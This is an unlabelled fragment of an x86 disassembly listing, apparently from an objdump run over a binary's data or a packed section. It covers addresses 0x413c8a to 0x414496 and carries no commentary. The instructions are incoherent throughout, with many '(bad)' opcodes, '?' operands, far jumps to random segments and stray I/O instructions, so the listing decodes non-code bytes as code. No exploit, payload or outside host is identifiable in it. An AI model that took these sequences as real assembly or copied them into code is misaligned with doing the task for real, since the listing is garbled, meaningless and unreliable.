  413c8a:	mov    ch,BYTE PTR [ebx-0x4f83d40b]
  413c90:	ret    
  413c91:	aas    
  413c92:	pushf  
  413c93:	xchg   esi,eax
  413c94:	ins    BYTE PTR es:[edi],dx
  413c95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c96:	mov    DWORD PTR [ebp+0x72379f6c],ecx
  413c9c:	jp     0x413c81
  413c9e:	call   0x273c:0xde0f5191
  413ca5:	or     eax,0xf4f2fadc
  413caa:	clc    
  413cab:	(bad)  
  413cac:	xchg   esp,eax
  413cad:	mov    eax,DWORD PTR [eax+edx*2-0x2578737]
  413cb4:	pusha  
  413cb5:	jecxz  0x413c60
  413cb7:	dec    esi
  413cb8:	push   ds
  413cb9:	aaa    
  413cba:	push   esi
  413cbb:	xchg   esp,eax
  413cbc:	xor    ebp,DWORD PTR [ebx+ebx*1+0x481c231f]
  413cc3:	jmp    0xf940:0x9135a289
  413cca:	inc    edx
  413ccb:	fidivr WORD PTR [esi+0x47]
  413cce:	and    eax,DWORD PTR [eax+0x41eb3e82]
  413cd4:	push   esp
  413cd5:	or     eax,0x8985ca8c
  413cda:	(bad)  
  413cdb:	outs   dx,BYTE PTR ds:[esi]
  413cdc:	sar    DWORD PTR [esi+0x333393dd],cl
  413ce2:	cmp    al,0xfe
  413ce4:	ret    
  413ce5:	daa    
  413ce6:	sti    
  413ce7:	leave  
  413ce8:	xchg   esi,eax
  413ce9:	push   ebp
  413cea:	jmp    0x4471:0xe41df56a
  413cf1:	mov    edx,0x3b6ea01c
  413cf6:	or     bl,BYTE PTR [edi]
  413cf8:	push   edi
  413cf9:	dec    ebx
  413cfa:	add    dl,BYTE PTR [ebx+eiz*4+0xf2cacf]
  413d01:	shr    DWORD PTR [edx+0x625bb4df],0x25
  413d08:	(bad)  
  413d09:	pusha  
  413d0a:	push   ds
  413d0b:	mov    dl,0xef
  413d0d:	(bad)  
  413d0e:	dec    esi
  413d0f:	mov    dl,0x91
  413d11:	(bad)
  413d15:	or     esp,DWORD PTR [ebp+0x40]
  413d18:	ja     0x413d61
  413d1a:	sub    ebp,DWORD PTR cs:[esi+eiz*4]
  413d1e:	cwde   
  413d1f:	cmp    cl,BYTE PTR [esi-0x249466de]
  413d25:	xor    BYTE PTR [esi+0x398c61d3],al
  413d2b:	gs scas eax,DWORD PTR es:[edi]
  413d2d:	pop    ebp
  413d2e:	mov    WORD PTR [esi],?
  413d30:	mov    ds:0xbef37c10,al
  413d35:	scas   eax,DWORD PTR es:[edi]
  413d36:	and    bh,BYTE PTR [esi]
  413d38:	dec    esp
  413d39:	gs and esp,eax
  413d3c:	xor    esi,edx
  413d3e:	stos   BYTE PTR es:[edi],al
  413d3f:	(bad)  
  413d40:	loop   0x413d04
  413d42:	pop    ds
  413d43:	sbb    eax,0x3b00f84b
  413d48:	sub    DWORD PTR [ebx+0xf],edi
  413d4b:	jmp    0xdac2c0d0
  413d50:	inc    esp
  413d51:	ret    
  413d52:	sub    ebx,DWORD PTR [edi+edx*8+0x75]
  413d56:	imul   esi,DWORD PTR ds:0x44c1b339,0x69899975
  413d60:	mov    cl,0xdd
  413d62:	adc    DWORD PTR [ecx],esi
  413d64:	mov    ds:0x725c9409,al
  413d69:	adc    bl,BYTE PTR [esi+ebp*2]
  413d6c:	in     eax,0xde
  413d6e:	xor    dh,al
  413d70:	push   es
  413d71:	sbb    al,0x18
  413d73:	push   esp
  413d74:	in     al,dx
  413d75:	mov    WORD PTR [eax-0x7e315400],?
  413d7b:	icebp  
  413d7c:	(bad)  
  413d7d:	xchg   ebp,eax
  413d7e:	add    BYTE PTR [eax+0x50cf8052],0xce
  413d85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413d86:	cli    
  413d87:	pop    esi
  413d88:	int    0xbf
  413d8a:	arpl   WORD PTR [eax+0x5d449db4],di
  413d90:	add    DWORD PTR [edx*2-0x347d1ae6],edx
  413d97:	sahf   
  413d98:	shr    DWORD PTR [edi-0x40620f66],cl
  413d9e:	pop    ss
  413d9f:	mov    ah,0xb3
  413da1:	jg     0x413d6b
  413da3:	ret    0xcfce
  413da6:	dec    edx
  413da7:	cli    
  413da8:	jg     0x413d9a
  413daa:	jo     0x413d6d
  413dac:	jecxz  0x413e04
  413dae:	mov    bh,0x57
  413db0:	stos   BYTE PTR es:[edi],al
  413db1:	mov    BYTE PTR [esi],al
  413db3:	hlt    
  413db4:	xchg   ebx,eax
  413db5:	aad    0x49
  413db7:	push   eax
  413db8:	sub    DWORD PTR [edi+0x5c88c288],0x4f12aab2
  413dc2:	mov    al,ds:0x4bd52f89
  413dc7:	fnsave ds:0xbba86187
  413dcd:	jg     0x413d4f
  413dcf:	mov    bl,0x7c
  413dd1:	repz jmp 0x413e06
  413dd4:	fs mov ah,0x45
  413dd7:	hlt    
  413dd8:	push   0xffffffd1
  413dda:	xor    ch,BYTE PTR [esi]
  413ddc:	jle    0x413dae
  413dde:	dec    edi
  413ddf:	imul   ebx,DWORD PTR [ecx-0x6717ae8c],0xffffff94
  413de6:	(bad)  
  413de7:	mov    ?,edi
  413de9:	push   es
  413dea:	mov    ebx,0x23ef663b
  413def:	jae    0x413e06
  413df1:	push   0x1c
  413df3:	jg     0x413dae
  413df5:	mov    ds:0x4090816c,al
  413dfa:	adc    eax,0xb1c2932f
  413dff:	fiadd  DWORD PTR [ecx+0x71]
  413e02:	std    
  413e03:	je     0x413e31
  413e05:	cld    
  413e06:	mov    ?,ecx
  413e08:	pop    ss
  413e09:	mov    eax,0x98613092
  413e0e:	sbb    al,0xec
  413e10:	bswap  edi
  413e12:	dec    ebx
  413e13:	(bad)
  413e16:	retf   
  413e17:	or     esi,DWORD PTR [ebx]
  413e19:	ss dec ebx
  413e1b:	sti    
  413e1c:	arpl   WORD PTR [ecx+edi*1],ax
  413e1f:	fstp   QWORD PTR ds:0x178c698c
  413e25:	mov    gs,WORD PTR [eax+ebx*4-0x247761f3]
  413e2c:	or     DWORD PTR ss:[ebp+0x1a3d681d],0x34
  413e34:	sbb    DWORD PTR [ebx-0x7f],0x9992c66d
  413e3b:	scas   al,BYTE PTR es:[edi]
  413e3c:	dec    esi
  413e3d:	pop    ebx
  413e3e:	mov    BYTE PTR [edi-0x4598c33c],dh
  413e44:	and    dl,BYTE PTR [edi+0x3a964a83]
  413e4a:	xor    ebp,DWORD PTR ds:0xff23a19
  413e50:	lods   eax,DWORD PTR ds:[esi]
  413e51:	mov    ch,0xb8
  413e53:	pop    ebp
  413e54:	pop    esi
  413e55:	clc    
  413e56:	aas    
  413e57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e58:	xchg   DWORD PTR [edi+0x3364245a],esi
  413e5e:	ja     0x413ea3
  413e60:	in     al,0x98
  413e62:	shl    ah,cl
  413e64:	(bad)  [ebp+0x326c7024]
  413e6a:	lds    eax,FWORD PTR fs:[edx]
  413e6d:	bound  edx,QWORD PTR [edi+0x4a]
  413e70:	push   esp
  413e71:	mov    al,ds:0xa311cda8
  413e76:	jbe    0x413eb9
  413e78:	and    BYTE PTR [eax],bh
  413e7a:	sahf   
  413e7b:	push   ds
  413e7c:	sbb    DWORD PTR [esi],ebp
  413e7e:	mov    ch,0xef
  413e80:	and    al,BYTE PTR [ecx-0x5da5e9b]
  413e86:	xor    eax,0x50138e15
  413e8b:	push   esp
  413e8c:	cmp    DWORD PTR [edi-0x1908504a],esi
  413e92:	lods   eax,DWORD PTR ds:[esi]
  413e93:	loope  0x413e1f
  413e95:	aas    
  413e96:	cld    
  413e97:	inc    ebp
  413e98:	push   0xcb150e6d
  413e9d:	push   ebx
  413e9e:	adc    al,0x40
  413ea0:	fcomp  DWORD PTR [edi+ecx*4+0x66d6d842]
  413ea7:	pushf  
  413ea8:	pop    edx
  413ea9:	vmread DWORD PTR [esi+0x21],esp
  413ead:	js     0x413ee0
  413eaf:	adc    bh,bh
  413eb1:	inc    ebp
  413eb2:	jbe    0x413e3a
  413eb4:	xor    DWORD PTR [edx],edx
  413eb6:	push   esi
  413eb7:	lahf   
  413eb8:	and    dl,al
  413eba:	sbb    BYTE PTR [ebp-0x4],bh
  413ebd:	xor    DWORD PTR [ebp+0x37],edx
  413ec0:	dec    edi
  413ec1:	mov    edi,0x1c2eee1f
  413ec6:	mov    esi,0x470844fe
  413ecb:	sbb    cl,bl
  413ecd:	aas    
  413ece:	popf   
  413ecf:	mov    al,ss:0xb1b2bcd9
  413ed5:	mov    ecx,0x6e8345e4
  413eda:	mov    WORD PTR ds:0x34eba786,ds
  413ee0:	lods   eax,DWORD PTR ds:[esi]
  413ee1:	jp     0x413f56
  413ee3:	out    dx,eax
  413ee4:	sbb    DWORD PTR [eax],esp
  413ee6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413ee7:	jnp    0x413ebb
  413ee9:	pop    ds
  413eea:	not    BYTE PTR [esi-0x5159e3e8]
  413ef0:	call   0x29dd2a8
  413ef5:	shl    DWORD PTR [eax+0x62],1
  413ef8:	ins    DWORD PTR es:[edi],dx
  413ef9:	(bad)  
  413efa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413efb:	and    BYTE PTR [edi-0x64bdc7bd],bl
  413f01:	mov    esi,ebx
  413f03:	in     eax,dx
  413f04:	jle    0x413eb2
  413f06:	(bad)  
  413f07:	gs mov cl,0x1c
  413f0a:	jmp    0x2cb4:0xe42d12bf
  413f11:	jo     0x413f3b
  413f13:	fs in  al,dx
  413f15:	xchg   edx,eax
  413f16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f17:	jne    0x413efe
  413f19:	stos   DWORD PTR es:[edi],eax
  413f1a:	nop
  413f1b:	jp     0x413f5e
  413f1d:	sar    BYTE PTR [ebx+esi*2],cl
  413f20:	shl    BYTE PTR [ebp-0x45a60662],cl
  413f26:	xchg   edi,eax
  413f27:	add    dl,BYTE PTR [esp+eiz*2+0x62d9c836]
  413f2e:	daa    
  413f2f:	daa    
  413f30:	and    bh,BYTE PTR ds:0xce491f43
  413f36:	fimul  DWORD PTR [ebx+eiz*1+0x40]
  413f3a:	jmp    DWORD PTR [edi*8-0x2120a861]
  413f41:	sbb    al,0xad
  413f43:	stos   DWORD PTR es:[edi],eax
  413f44:	mov    BYTE PTR [edx],cl
  413f46:	test   al,0x65
  413f48:	clc    
  413f49:	push   esp
  413f4a:	dec    esp
  413f4b:	add    esp,ebx
  413f4d:	jl     0x413fcd
  413f4f:	call   DWORD PTR [edi]
  413f51:	sbb    ecx,DWORD PTR [edi-0x7084363d]
  413f57:	hlt    
  413f58:	int    0xb0
  413f5a:	add    al,0xa3
  413f5c:	add    BYTE PTR [esi],0x1d
  413f5f:	cmp    eax,0x1f4eeb92
  413f64:	push   ebx
  413f65:	sub    al,BYTE PTR [edx]
  413f67:	ja     0x413ef3
  413f69:	or     DWORD PTR [ebp+0x65d499c5],eax
  413f6f:	inc    ebp
  413f70:	sub    al,BYTE PTR [ebx+eax*4]
  413f73:	inc    ebx
  413f74:	popf   
  413f75:	xchg   edi,eax
  413f76:	add    al,BYTE PTR [ebx+0x75]
  413f79:	ret    0x671f
  413f7c:	inc    eax
  413f7d:	or     eax,0x77c8965b
  413f82:	dec    edx
  413f83:	or     eax,DWORD PTR [eax]
  413f85:	nop
  413f86:	sbb    eax,0xb9c6fcd
  413f8b:	inc    esi
  413f8c:	adc    bl,BYTE PTR [eax-0x1a159b66]
  413f92:	ret    0x3d1
  413f95:	retf   0xe7f0
  413f98:	in     eax,0x42
  413f9a:	das    
  413f9b:	jge    0x413f22
  413f9d:	jmp    0xe524:0x61a90a95
  413fa4:	mov    bh,0xf5
  413fa6:	sbb    DWORD PTR [ebx+0x32e2e406],0x2dc5cde6
  413fb0:	mov    dl,0x49
  413fb2:	repnz addr16 sbb al,0xe9
  413fb6:	xlat   BYTE PTR ds:[ebx]
  413fb7:	cmp    ebx,ecx
  413fb9:	fadd   DWORD PTR [eax]
  413fbb:	add    ecx,DWORD PTR [edx]
  413fbd:	add    ch,ah
  413fbf:	xor    BYTE PTR [edi-0xa6dd86f],0x9c
  413fc6:	pop    edi
  413fc7:	xchg   ebp,eax
  413fc8:	mov    dl,0x24
  413fca:	(bad)  
  413fcb:	xor    eax,DWORD PTR [ecx]
  413fcd:	cmp    eax,0x70e4a14f
  413fd2:	xchg   ebx,eax
  413fd3:	stos   BYTE PTR es:[edi],al
  413fd4:	ss dec esp
  413fd6:	in     eax,dx
  413fd7:	pop    si
  413fd9:	rcl    dh,1
  413fdb:	xor    eax,0xb2bf7326
  413fe0:	jg     0x414052
  413fe2:	sub    DWORD PTR [edi-0x7f],ebp
  413fe5:	in     eax,dx
  413fe6:	jp     0x414061
  413fe8:	out    0xaa,al
  413fea:	mov    ds:0x993f666a,eax
  413fef:	jl     0x413f8a
  413ff1:	and    eax,0xae06df8c
  413ff6:	inc    eax
  413ff7:	xor    DWORD PTR [ebx],eax
  413ff9:	and    BYTE PTR [esi],dl
  413ffb:	jl     0x414067
  413ffd:	push   ecx
  413ffe:	lods   al,BYTE PTR ds:[esi]
  413fff:	test   eax,0xe79dd3
  414004:	(bad)  
  414005:	push   eax
  414006:	push   cs
  414007:	pop    edx
  414008:	pop    ss
  414009:	cmp    ah,cl
  41400b:	loope  0x413fee
  41400d:	dec    esp
  41400e:	fwait
  41400f:	add    eax,0xc640fe67
  414014:	or     al,0xb0
  414016:	mov    esp,0xec2eb195
  41401b:	or     DWORD PTR [edi],esi
  41401d:	call   0xef56:0x53e5c721
  414024:	push   esp
  414025:	sub    al,0x30
  414027:	push   edx
  414028:	push   0x89f7ec67
  41402d:	cmp    edx,0x7b
  414030:	call   0x8e0fc6b5
  414035:	and    eax,0xdcdcb27b
  41403a:	xor    DWORD PTR [esi-0x2b],edi
  41403d:	retf   0xacf8
  414040:	loop   0x4140be
  414042:	outs   dx,BYTE PTR ds:[esi]
  414043:	pop    edi
  414044:	mov    eax,ds:0xdf931921
  414049:	lea    edx,[ecx]
  41404b:	mov    esi,0xc7dbe980
  414050:	ret    0xd14d
  414053:	fwait
  414054:	xchg   esp,eax
  414056:	test   DWORD PTR gs:[eax],0xd32cae15
  41405d:	push   0x7491c05b
  414062:	aad    0x8
  414064:	adc    ch,dl
  414066:	fcom   DWORD PTR [ebx+0x7b]
  414069:	sub    eax,0x95cc274a
  41406e:	out    0xa7,al
  414070:	fwait
  414071:	jb     0x414001
  414073:	push   ds
  414074:	popa   
  414075:	loopne 0x414021
  414077:	aaa    
  414078:	int    0xf7
  41407a:	pop    edi
  41407b:	cmp    ecx,DWORD PTR [edi-0x42]
  41407e:	or     ah,BYTE PTR [ecx-0x71]
  414081:	int3   
  414082:	cmp    BYTE PTR [ecx],bh
  414084:	das    
  414085:	test   esp,edi
  414087:	push   es
  414088:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414089:	jmp    0xa75996c
  41408e:	dec    esp
  41408f:	sub    al,0xfc
  414091:	repnz push es
  414093:	adc    DWORD PTR [esi+0x27040469],edi
  414099:	in     eax,0xcc
  41409b:	push   0x36
  41409d:	pop    es
  41409e:	jl     0x414117
  4140a0:	sbb    cl,cl
  4140a2:	(bad)  
  4140a3:	ss jne 0x41402d
  4140a6:	call   0xfbee9e1b
  4140ab:	or     eax,0x8a29ea46
  4140b0:	cdq    
  4140b1:	dec    edx
  4140b2:	push   esp
  4140b4:	idiv   BYTE PTR [ebp-0x4ca93aca]
  4140ba:	nop
  4140bb:	loope  0x4140e3
  4140bd:	call   0xd77e:0x86639e65
  4140c4:	jl     0x414114
  4140c6:	cmp    BYTE PTR [ecx],bl
  4140c8:	mov    eax,0xafe72de
  4140cd:	jle    0x4140f5
  4140cf:	call   0x1fb3:0xe15f8f23
  4140d6:	pop    es
  4140d7:	dec    ebp
  4140d8:	sbb    edx,DWORD PTR [ecx]
  4140da:	jge    0x414104
  4140dc:	xchg   DWORD PTR [ebx+0x3ca1da9e],ebx
  4140e2:	inc    eax
  4140e3:	shl    ch,cl
  4140e5:	cmp    DWORD PTR [edi],0x7f
  4140e8:	sbb    eax,0x50b02186
  4140ed:	(bad)  
  4140ef:	inc    esp
  4140f0:	jp     0x414073
  4140f2:	jmp    0xa4b5eee8
  4140f7:	cmp    DWORD PTR [edx-0x46],esp
  4140fa:	nop
  4140fb:	repz xchg bl,bl
  4140fe:	jb     0x41412d
  414100:	rcl    al,cl
  414102:	adc    eax,0x17ddefa2
  414107:	sub    BYTE PTR [edi+0x5d],bl
  41410a:	xor    ch,BYTE PTR [eax-0x7c]
  41410d:	mov    ebx,0xd9470c0e
  414112:	sbb    ah,BYTE PTR [ebx+0x705374cc]
  414118:	or     eax,esi
  41411a:	sub    BYTE PTR [edi+0x4c],dl
  41411d:	in     al,0xab
  41411f:	int    0x96
  414121:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414122:	and    ebx,edx
  414124:	push   cs
  414125:	fist   DWORD PTR [edx+0x7a]
  414128:	dec    eax
  414129:	std    
  41412a:	adc    dl,BYTE PTR [ebx]
  41412c:	or     eax,0x726d0e19
  414131:	inc    eax
  414132:	inc    edx
  414133:	mov    ebx,0x7ce4a353
  414138:	repz add dh,cl
  41413b:	inc    ebx
  41413c:	addr16 mov dh,0x22
  41413f:	or     DWORD PTR [ebx+0x1aef0ac4],ebp
  414145:	inc    esp
  414146:	push   edx
  414147:	or     DWORD PTR [ebp-0x80],esi
  41414a:	xchg   esi,eax
  41414b:	or     BYTE PTR [ebp+0x3c],al
  41414e:	cmp    DWORD PTR ds:0x6178757,ebp
  414154:	ret    
  414155:	add    DWORD PTR [ebp+0x74ed40d5],ebp
  41415b:	loop   0x414148
  41415d:	adc    ch,0xb3
  414160:	fiadd  DWORD PTR [eax]
  414162:	push   ebp
  414163:	test   DWORD PTR [eax+0x313ed2e6],0x2ed376a2
  41416d:	ror    BYTE PTR [ebp-0x2e9a5276],0xf5
  414174:	and    esp,DWORD PTR [esi]
  414176:	lahf   
  414177:	outs   dx,DWORD PTR fs:[esi]
  414179:	int3   
  41417a:	test   BYTE PTR [edi+0x706b2cc5],bl
  414180:	xchg   edx,eax
  414181:	repz add eax,0xa5e73c62
  414187:	pop    ds
  414188:	jg     0x4141c5
  41418a:	js     0x4141f8
  41418c:	mov    BYTE PTR [esp+ecx*8-0x2a575eed],bl
  414193:	icebp  
  414194:	mov    esi,0x2f464289
  414199:	mov    ebx,0xd6010876
  41419e:	das    
  41419f:	sahf   
  4141a0:	dec    ecx
  4141a1:	jb     0x4141c7
  4141a3:	popa   
  4141a4:	lea    edi,[ebx]
  4141a6:	dec    esi
  4141a7:	push   es
  4141a8:	shl    BYTE PTR [ebx-0x528884bc],0x2a
  4141af:	push   ds
  4141b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141b1:	and    eax,0x466e515
  4141b6:	cmp    DWORD PTR [ebx+0x70],ecx
  4141b9:	and    al,0x5f
  4141bb:	and    DWORD PTR [edx+0x57452175],edi
  4141c1:	pop    ebx
  4141c2:	ret    
  4141c3:	push   eax
  4141c4:	cvttps2pi mm1,QWORD PTR [eax+esi*1-0x5c8a024]
  4141cc:	pushf  
  4141cd:	lods   al,BYTE PTR ds:[esi]
  4141ce:	in     eax,0x3f
  4141d0:	add    ch,cl
  4141d2:	xchg   esp,eax
  4141d3:	cs mov dh,0xbd
  4141d6:	mov    edi,0xd4da9790
  4141db:	bound  ecx,QWORD PTR [ebp+ebp*1+0x16b4d14f]
  4141e2:	cmp    esp,DWORD PTR ds:0x1489a623
  4141e8:	pop    ebp
  4141e9:	cmp    ah,BYTE PTR ds:0x21624604
  4141ef:	sub    bh,BYTE PTR [ebx+0x7503944b]
  4141f5:	cmp    ebp,edx
  4141f7:	mov    dl,0xfd
  4141f9:	xor    edx,DWORD PTR [ebx-0x66]
  4141fc:	repz sub eax,0x42b21a69
  414202:	sub    eax,0xecfdea7
  414207:	cbw    
  414209:	lds    esi,FWORD PTR ds:0xebd621d8
  41420f:	jnp    0x4141bd
  414211:	(bad)  
  414212:	popa   
  414213:	xor    eax,0xd315e602
  414218:	sahf   
  414219:	inc    ecx
  41421a:	inc    edi
  41421b:	pusha  
  41421c:	std    
  41421d:	fcmovnbe st,st(6)
  41421f:	fmul   QWORD PTR [esi+ebp*4-0x5582176d]
  414226:	popf   
  414227:	push   ss
  414228:	push   ds
  414229:	cdq    
  41422a:	ins    DWORD PTR es:[edi],dx
  41422b:	pop    ebp
  41422c:	mov    bl,0x7a
  41422e:	or     DWORD PTR [ebp-0x63],edx
  414231:	jne    0x41424e
  414233:	(bad)  
  414234:	fist   WORD PTR [ebx+esi*8-0x7d3a5f3d]
  41423b:	sub    DWORD PTR [ecx+0x71120300],eax
  414241:	out    dx,al
  414242:	outs   dx,BYTE PTR ds:[esi]
  414243:	jbe    0x4142c3
  414245:	loopne 0x41423a
  414247:	adc    esp,DWORD PTR [ebx]
  414249:	mov    cl,0x79
  41424b:	fs jl  0x414200
  41424e:	xor    ecx,esp
  414250:	lods   eax,DWORD PTR ds:[esi]
  414251:	ret    0xa51
  414254:	sbb    BYTE PTR [eax],0x39
  414257:	jnp    0x4141f3
  414259:	outs   dx,BYTE PTR ds:[esi]
  41425a:	fld    TBYTE PTR [edx+eax*4-0x3baaa10f]
  414261:	js     0x414299
  414263:	arpl   WORD PTR [eax-0x4b],ax
  414266:	jmp    DWORD PTR [edx]
  414268:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414269:	mov    eax,0xc9a9db8c
  41426e:	jmp    DWORD PTR [edx]
  414270:	sbb    BYTE PTR [ebp+0x12],0x30
  414274:	cmp    ch,bl
  414276:	add    al,0xd8
  414278:	mov    dh,0xcd
  41427a:	and    esi,DWORD PTR [ecx+0x6c]
  41427d:	fstp   TBYTE PTR [edx-0x57620790]
  414283:	xchg   edx,eax
  414284:	pop    es
  414285:	push   edx
  414286:	jmp    0x50ac:0x905df97c
  41428d:	pop    ecx
  41428e:	mov    dh,0x58
  414290:	sbb    eax,eax
  414292:	mov    ebp,?
  414294:	mov    DWORD PTR [eax-0x16fa14c1],edx
  41429a:	and    al,al
  41429c:	jae    0x4142fb
  41429e:	(bad)  
  41429f:	cld    
  4142a0:	pop    ebx
  4142a1:	sbb    dh,BYTE PTR [edx+0x5]
  4142a4:	sub    esp,eax
  4142a6:	das    
  4142a7:	out    dx,al
  4142a8:	mov    eax,0x25e694c7
  4142ad:	xlat   BYTE PTR ds:[ebx]
  4142ae:	and    BYTE PTR [esi],0xf2
  4142b1:	pop    edi
  4142b2:	jae    0x41432b
  4142b4:	dec    ebp
  4142b5:	or     bl,BYTE PTR [eax]
  4142b7:	lds    ebx,FWORD PTR [edi]
  4142b9:	cwde   
  4142ba:	mov    ch,al
  4142bc:	or     dl,BYTE PTR [esi]
  4142be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142bf:	mov    dl,0xd7
  4142c1:	adc    dh,BYTE PTR [ecx+edx*8]
  4142c4:	adc    al,0x56
  4142c6:	jno    0x414279
  4142c8:	call   0xaf46:0xadd85500
  4142cf:	jl     0x4142b0
  4142d1:	aas    
  4142d2:	ret    0x1e78
  4142d5:	inc    esp
  4142d6:	push   esp
  4142d7:	shl    eax,1
  4142d9:	push   eax
  4142da:	lods   eax,DWORD PTR ds:[esi]
  4142db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142dc:	mov    ebp,0x371fcad8
  4142e1:	rcl    DWORD PTR [ebp-0x68204920],cl
  4142e7:	mov    ds,sp
  4142ea:	repz cmp DWORD PTR [ecx+0x2646ee8b],ebx
  4142f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142f2:	(bad)  
  4142f3:	(bad)  
  4142f4:	lods   eax,DWORD PTR ds:[esi]
  4142f5:	mov    al,ds:0x503c6052
  4142fa:	ror    DWORD PTR [edi],0x51
  4142fd:	cmp    al,0xc8
  4142ff:	and    BYTE PTR [ebx+0x21e16d39],al
  414305:	jg     0x4142fc
  414307:	out    0x29,al
  414309:	nop
  41430a:	stos   BYTE PTR es:[edi],al
  41430b:	push   ds
  41430c:	hlt    
  41430d:	xchg   ebx,eax
  41430e:	cli    
  41430f:	sub    DWORD PTR [ebp-0x13],eax
  414312:	int3   
  414313:	and    edi,DWORD PTR [esi-0x46892cfa]
  414319:	jg     0x4142f8
  41431b:	mov    es,WORD PTR [ecx+ebp*8-0x36]
  41431f:	loopne 0x41435a
  414321:	push   esi
  414322:	ins    BYTE PTR es:[edi],dx
  414323:	enter  0xa8ba,0x1e
  414327:	(bad)  
  414328:	(bad)  
  414329:	call   0xa63b5fd7
  41432e:	and    ch,BYTE PTR [eax]
  414330:	outs   dx,DWORD PTR ds:[esi]
  414331:	out    0x1a,al
  414333:	lock fistp QWORD PTR [ebx+esi*4]
  414337:	mov    DWORD PTR [esi+0x101bdd8b],edi
  41433d:	es jg  0x41434f
  414340:	add    BYTE PTR [edi],cl
  414342:	jbe    0x41433b
  414344:	cmp    bl,ch
  414346:	(bad)  
  414347:	neg    BYTE PTR [ebx]
  414349:	std    
  41434a:	(bad)  
  41434c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41434d:	fwait
  41434e:	sub    DWORD PTR [ebx],esi
  414350:	faddp  st(0),st
  414352:	mov    ch,0x7d
  414354:	and    al,0x5
  414356:	mov    WORD PTR [edi+0x45d172b5],ds
  41435c:	mov    bh,0xb4
  41435e:	pop    edi
  41435f:	mov    ecx,0x9db499c8
  414364:	cmp    DWORD PTR [eax+0x2231dba1],esi
  41436a:	scas   eax,DWORD PTR es:[edi]
  41436b:	adc    DWORD PTR [eax-0x6d5824f7],ebx
  414371:	push   0x677bbea
  414376:	mov    ah,0xc1
  414378:	aad    0xff
  41437a:	jmp    0x414338
  41437c:	hlt    
  41437d:	in     al,dx
  41437e:	add    eax,0x207d5141
  414383:	cmp    BYTE PTR [esi],0x1e
  414386:	cmp    eax,0x591cfba6
  41438b:	nop
  41438c:	xchg   BYTE PTR [ebp-0x20b6d9a8],dh
  414392:	into   
  414393:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414394:	xor    eax,0xfb473d67
  414399:	fs popa 
  41439b:	xchg   ebx,eax
  41439c:	jnp    0x41433f
  41439e:	retf   
  41439f:	mov    bh,0xe
  4143a1:	push   ss
  4143a2:	jmp    0x6a68:0x5be7f156
  4143a9:	adc    al,0xde
  4143ab:	lods   eax,DWORD PTR ds:[esi]
  4143ac:	and    eax,0xa609dd17
  4143b1:	mov    ebx,0x6c3cacc8
  4143b6:	cdq    
  4143b7:	(bad)  
  4143b8:	mov    ebp,0xff6777fb
  4143bd:	ret    0x38fc
  4143c0:	rcl    esi,0xcf
  4143c3:	mov    esi,0x97e9094b
  4143c8:	xchg   ebx,eax
  4143c9:	xchg   BYTE PTR [ebx+0x79294db4],dh
  4143cf:	pop    ds
  4143d0:	repnz cmc 
  4143d2:	xor    BYTE PTR [ecx+0x30],bl
  4143d5:	jp     0x414394
  4143d7:	and    al,0xfe
  4143d9:	nop
  4143da:	mov    ecx,DWORD PTR gs:[esi]
  4143dd:	mov    cl,0x9b
  4143df:	xor    DWORD PTR [esi+0x525fa5cb],esp
  4143e5:	fimul  DWORD PTR [edi]
  4143e7:	and    DWORD PTR [edi+0x94294a3],ecx
  4143ed:	(bad)  
  4143ee:	out    dx,eax
  4143ef:	push   ebp
  4143f0:	shl    BYTE PTR [ebx+0x1a],0x66
  4143f4:	outs   dx,DWORD PTR ds:[esi]
  4143f5:	arpl   WORD PTR [ebp+0x22a4f9bf],bp
  4143fb:	imul   ecx,DWORD PTR [ecx+edi*1],0x95119ffd
  414402:	push   cs
  414403:	ja     0x4143a3
  414405:	fstp   TBYTE PTR ds:0x7f1d431c
  41440b:	pushf  
  41440c:	call   0xe0ca:0x3818b65b
  414413:	and    al,0x2d
  414415:	sbb    eax,0x6e166a58
  41441a:	loope  0x414475
  41441c:	pop    ss
  41441d:	cmp    ecx,DWORD PTR [esi]
  41441f:	icebp  
  414420:	or     al,0xca
  414422:	fist   DWORD PTR [edi+0xc732e2c]
  414428:	push   ecx
  414429:	in     eax,dx
  41442a:	push   ecx
  41442b:	call   0x329acf3e
  414430:	hlt    
  414431:	cmp    edx,esi
  414433:	xor    eax,0x662c905c
  414438:	shl    eax,1
  41443a:	and    ebx,DWORD PTR [eax+edi*2+0x61]
  41443e:	push   ecx
  41443f:	push   ecx
  414440:	fcomp  DWORD PTR [esi-0x5014ed09]
  414446:	xor    ch,BYTE PTR [ebp-0x5e]
  414449:	loope  0x414475
  41444b:	inc    esi
  41444c:	mov    WORD PTR [ecx-0x482808c5],ss
  414452:	mov    edx,0x96ef7ef
  414457:	test   al,0x38
  414459:	dec    edi
  41445a:	dec    ecx
  41445b:	sub    esi,eax
  41445d:	jp     0x4144dd
  41445f:	sbb    dh,BYTE PTR fs:[ecx-0x4a0257c5]
  414466:	retf   
  414467:	xor    al,0x22
  414469:	push   edx
  41446a:	xchg   esp,eax
  41446b:	shl    DWORD PTR [ecx-0x3a],1
  41446e:	sbb    bl,BYTE PTR [edx-0x45]
  414471:	ror    bl,cl
  414473:	push   cs
  414474:	jmp    0x9b9:0x62e4945f
  41447b:	aas    
  41447c:	lods   eax,DWORD PTR ds:[esi]
  41447d:	repz out 0x9,al
  414480:	sub    BYTE PTR [esi+edi*4],ch
  414483:	or     esi,ebp
  414485:	in     eax,0xe7
  414487:	dec    ecx
  414488:	mov    cl,0x9a
  41448a:	cmp    DWORD PTR [ebx-0x2],ebp
  41448d:	popf   
  41448e:	mov    esp,0xb4eed33f
  414493:	xchg   DWORD PTR [esi+0xb],esi
  414496:	sbb    BYTE PTR [edi],ah
